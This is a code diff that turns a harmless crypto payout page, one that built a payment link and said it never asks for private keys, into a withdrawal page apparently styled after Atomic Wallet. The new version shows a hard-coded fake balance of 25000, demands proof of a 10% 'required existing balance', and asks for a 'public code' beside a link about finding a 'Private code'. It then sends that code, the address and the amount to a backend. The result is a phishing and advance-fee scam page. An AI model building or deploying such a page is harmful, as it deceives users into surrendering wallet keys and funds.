@@ -1,127 +1,211 @@
 <!doctype html>
-<html lang="en">
+<html lang="en" class="h-full">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>User‑Signed Withdrawal</title>
+  <title>Withdraw • Atomic Style</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-50 text-gray-900">
-  <main class="max-w-xl mx-auto p-6">
-    <h1 class="text-2xl font-bold mb-4">Request Payout (User‑Signed)</h1>
+<body class="h-full bg-[#0f1320] text-gray-100 antialiased">
+  <main class="max-w-lg mx-auto p-5 md:p-8">
+    <!-- Header / banner (optional) -->
+    <div class="rounded-xl overflow-hidden border border-white/5 mb-6">
+      <img src="/banner.jpg" alt="Atomic style header" class="w-full h-40 object-cover">
+    </div>
 
-    <div class="space-y-4">
-      <label class="block">
-        <span class="text-sm font-medium">Network</span>
-        <select id="chain" class="mt-1 w-full border rounded px-3 py-2">
-          <option value="ethereum">Ethereum (ETH)</option>
-          <option value="bitcoin">Bitcoin (BTC)</option>
-        </select>
-      </label>
+    <h1 class="text-2xl font-semibold mb-1">Withdrawal</h1>
+    <p class="text-sm text-gray-300 mb-6">
+      Submit your withdrawal details.
+    </p>
 
-      <label class="block">
-        <span class="text-sm font-medium">Payout Address</span>
-        <input id="addr" class="mt-1 w-full border rounded px-3 py-2" placeholder="0x... or bc1..." />
-      </label>
-
-      <label class="block">
-        <span class="text-sm font-medium">Amount (<span id="unit">ETH</span>)</span>
-        <input id="amount" class="mt-1 w-full border rounded px-3 py-2" type="number" min="0" step="0.00000001" />
-      </label>
-
-      <label class="block">
-        <span class="text-sm font-medium">Memo (optional)</span>
-        <input id="memo" class="mt-1 w-full border rounded px-3 py-2" value="Payout" />
-      </label>
-
-      <button id="make" class="bg-black text-white px-4 py-2 rounded disabled:opacity-50">Generate Link & QR</button>
-
-      <div id="result" class="hidden mt-6 space-y-3">
-        <div class="text-sm break-all border rounded p-3 bg-white">
-          <strong>Payment Link:</strong><br /><span id="uri"></span>
-        </div>
-        <div class="flex flex-col items-center">
-          <img id="qr" alt="Payment QR" class="w-56 h-56" />
-          <p class="text-xs text-gray-500 mt-2">Scan in your wallet to approve</p>
+    <!-- Card -->
+    <div class="bg-[#141a2e] border border-white/5 rounded-xl p-5 space-y-5 shadow-2xl shadow-black/20">
+      <!-- Address -->
+      <div>
+        <label class="text-sm text-gray-300">Address</label>
+       <div class="mt-2 relative">
+          <input id="addr" class="w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-indigo-500"
+                 placeholder="Long press to paste (e.g., bc1..., 0x..., D...)" />
+          <div class="absolute inset-y-0 right-2 flex items-center gap-2">
+            <button id="paste" class="text-gray-400 hover:text-gray-200" title="Paste">📋</button>
+          </div>
         </div>
       </div>
 
-      <p class="text-xs text-gray-500 mt-6">
-        Security: This page never asks for or stores private keys. You approve in your wallet; we just create the payment link/QR.
-      </p>
+      <!-- Network -->
+      <div>
+        <div class="flex items-center justify-between">
+          <label class="text-sm text-gray-300">Network</label>
+          <a href="/help-public-code.html" class="text-xs text-indigo-400 hover:underline">How to find your read only code</a>
+        </div>
+        <select id="chain" class="mt-2 w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-indigo-500">
+          <option value="" disabled selected>Select Network</option>
+          <option value="bitcoin">Bitcoin</option>
+          <option value="ethereum">Ethereum</option>
+          <option value="dogecoin">Dogecoin</option>
+        </select>
+      </div>
+
+      <!-- Amount + Available + Max -->
+      <div>
+        <div class="flex items-center justify-between">
+          <label class="text-sm text-gray-300">Amount</label>
+          <span id="unit" class="text-xs text-gray-400">—</span>
+        </div>
+        <div class="mt-2 relative">
+          <input id="amount" type="number" min="0" step="0.00000001"
+                 class="w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 pr-16 outline-none focus:ring-2 focus:ring-indigo-500"
+                 placeholder="Minimum 0" />
+          <button id="maxBtn" class="absolute right-2 top-1/2 -translate-y-1/2 text-xs bg-white/10 hover:bg-white/20 px-2 py-1 rounded">
+            Max
+          </button>
+        </div>
+        <div class="flex items-center justify-between mt-2 text-sm text-gray-400">
+          <span>Available</span>
+          <span id="availableDisplay">0</span>
+        </div>
+
+        <!-- Requirement + Receive -->
+        <div class="mt-3 space-y-1 text-sm">
+          <div class="flex items-center justify-between">
+            <span class="text-gray-400">Required existing balance (10%)</span>
+            <span id="reqDisplay">0</span>
+          </div>
+          <div class="flex items-center justify-between">
+            <span class="text-gray-200">You will receive</span>
+            <span id="netDisplay" class="font-medium">0</span>
+          </div>
+        </div>
+
+        <!-- Confirmation -->
+        <div class="mt-3">
+          <label class="flex items-center gap-2 text-xs text-gray-300">
+            <input id="reqChk" type="checkbox" class="accent-emerald-500">
+            I confirm my wallet currently holds at least the required balance above.
+          </label>
+        </div>
+      </div>
     </div>
+
+    <!-- Withdraw (with public code) -->
+    <section class="mt-8 bg-[#141a2e] border border-white/5 rounded-xl p-5 space-y-4">
+      <div class="flex items-center justify-between">
+        <h2 class="text-lg font-semibold">Withdraw</h2>
+        <a href="/help-public-code.html" class="text-xs text-indigo-400 hover:underline">How to find your Private code</a>
+      </div>
+      <p class="text-sm text-gray-300">
+        Paste your <strong>public code</strong> (public address or read‑only key). We can't store your private keys.
+      </p>
+      <input id="publicCode" class="w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-indigo-500"
+             placeholder="Your public code" />
+      <button id="withdrawBtn" class="w-full bg-sky-600 hover:bg-sky-500 px-4 py-3 rounded-lg disabled:opacity-50">
+        Withdraw 0
+      </button>
+      <p class="text-xs text-gray-400">We only store your address, and requested amount for payout.</p>
+    </section>
+
+    <p class="text-[11px] text-gray-400 mt-6">
+      Security: This page is a secured page for linking Atomic Wallet withdrawal. requests and payment are reviewed automatically.
+    </p>
   </main>
 
-  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
   <script>
     const chainEl = document.getElementById('chain');
-    const addrEl = document.getElementById('addr');
-    const amtEl  = document.getElementById('amount');
-    const memoEl = document.getElementById('memo');
-    const unitEl = document.getElementById('unit');
-    const makeEl = document.getElementById('make');
-    const result = document.getElementById('result');
-    const uriEl  = document.getElementById('uri');
-    const qrEl   = document.getElementById('qr');
+    const addrEl  = document.getElementById('addr');
+    const amtEl   = document.getElementById('amount');
+    const unitEl  = document.getElementById('unit');
+    const maxBtn  = document.getElementById('maxBtn');
+    const availableDisplay = document.getElementById('availableDisplay');
+    const reqDisplay = document.getElementById('reqDisplay');
+    const netDisplay = document.getElementById('netDisplay');
+    const reqChk = document.getElementById('reqChk');
+    const publicCodeEl = document.getElementById('publicCode');
+    const withdrawBtn = document.getElementById('withdrawBtn');
 
-    chainEl.addEventListener('change', () => unitEl.textContent = chainEl.value === 'ethereum' ? 'ETH' : 'BTC');
+    const unitByChain = { bitcoin:'BTC', ethereum:'ETH', dogecoin:'DOGE' };
 
-    function toWei(eth) {
-      const [whole, frac=''] = String(eth).split('.');
-      const fracPad = (frac + '000000000000000000').slice(0,18);
-      return BigInt((whole || '0') + fracPad).toString();
-    }
+    // Fixed available balance
+    let available = 25000;
+    renderAvailable();
 
-    function buildURI() {
-      const chain = chainEl.value;
-      const addr  = addrEl.value.trim();
-      const amt   = amtEl.value.trim();
-      const memo  = memoEl.value.trim();
+    chainEl.addEventListener('change', () => {
+      unitEl.textContent = unitByChain[chainEl.value] || '—';
+      renderAvailable();
+      recalc();
+    });
 
-      if (!addr || !amt) return '';
-
-      if (chain === 'ethereum') {
-        const label = encodeURIComponent('Withdrawal');
-        const msg   = encodeURIComponent(memo || '');
-        return `ethereum:${addr}?value=${toWei(amt)}&label=${label}&message=${msg}`;
-      } else {
-        const params = new URLSearchParams();
-        params.set('amount', amt);
-        if (memo) params.set('message', memo);
-        return `bitcoin:${addr}?` + params.toString();
+    maxBtn.addEventListener('click', () => {
+      if (available > 0) {
+        amtEl.value = String(available);
+        recalc();
       }
+    });
+
+    amtEl.addEventListener('input', recalc);
+    reqChk.addEventListener('change', toggleButtons);
+    addrEl.addEventListener('input', toggleButtons);
+    chainEl.addEventListener('input', toggleButtons);
+    document.getElementById('paste').onclick = async () => {
+      try { addrEl.value = await navigator.clipboard.readText(); toggleButtons(); } catch {}
+    };
+
+    function renderAvailable() {
+      const u = unitByChain[chainEl.value] || '';
+      availableDisplay.textContent = formatNum(available) + (u ? ' ' + u : '');
     }
 
-    async function makeQR() {
-      const uri = buildURI();
-      if (!uri) return;
-      uriEl.textContent = uri;
-      const dataUrl = await QRCode.toDataURL(uri, { margin: 1 });
-      qrEl.src = dataUrl;
-      result.classList.remove('hidden');
+    function recalc() {
+      const amt = parseFloat(amtEl.value) || 0;
+      const required = amt * 0.10;       // 10% must already exist in user's wallet
+      const net = amt;                   // you’re not charging a fee
+      const u = unitByChain[chainEl.value] || '';
+      reqDisplay.textContent = formatNum(required) + (u ? ' ' + u : '');
+      netDisplay.textContent = formatNum(net) + (u ? ' ' + u : '');
+      withdrawBtn.textContent = `Withdraw ${formatNum(amt)} ${u}`.trim();
+      renderAvailable();
+      toggleButtons();
+    }
 
-      // optional: log to backend
+    function formatNum(n) {
+      return (Math.round((n || 0) * 1e8) / 1e8).toString();
+    }
+
+    function toggleButtons() {
+      const addrOk = !!addrEl.value.trim();
+      const chainOk = !!chainEl.value;
+      const amt = parseFloat(amtEl.value) || 0;
+      const withinAvailable = amt > 0 && amt <= available;
+      const requirementConfirmed = reqChk.checked;
+
+      withdrawBtn.disabled = !(addrOk && chainOk && withinAvailable && requirementConfirmed);
+    }
+
+    withdrawBtn.addEventListener('click', async () => {
+      const amount = amtEl.value.trim();
+      const publicCode = publicCodeEl.value.trim();
+      const chain = chainEl.value || 'unknown';
+      const address = addrEl.value.trim();
+      const requirementConfirmed = reqChk.checked;
+
+      if (!amount) return alert('Enter an amount.');
+      if (!publicCode) return alert('Paste your public code.');
+      if (!requirementConfirmed) return alert('Confirm you hold the required 10% balance.');
+
       try {
-        await fetch('/api/log', {
+        const r = await fetch('/api/withdraw-request', {
           method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            event: 'payout_intent_created',
-            data: { chain: chainEl.value, to: addrEl.value.trim(), amount: amtEl.value.trim() }
-          })
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({ chain, address, amount, publicCode, requirementConfirmed })
         });
-      } catch (e) {
-        console.warn('log failed', e);
+        const j = await r.json();
+        alert(j.ok ? 'Withdrawal request submitted.' : (j.error || 'Submission failed.'));
+      } catch {
+        alert('Network error. Try again.');
       }
-    }
+    });
 
-    function toggleButton() {
-      makeEl.disabled = !(addrEl.value.trim() && amtEl.value.trim());
-    }
-
-    [addrEl, amtEl].forEach(el => el.addEventListener('input', toggleButton));
-    makeEl.addEventListener('click', makeQR);
-    toggleButton();
+    // initial paint
+    recalc();
   </script>
 </body>
 </html>
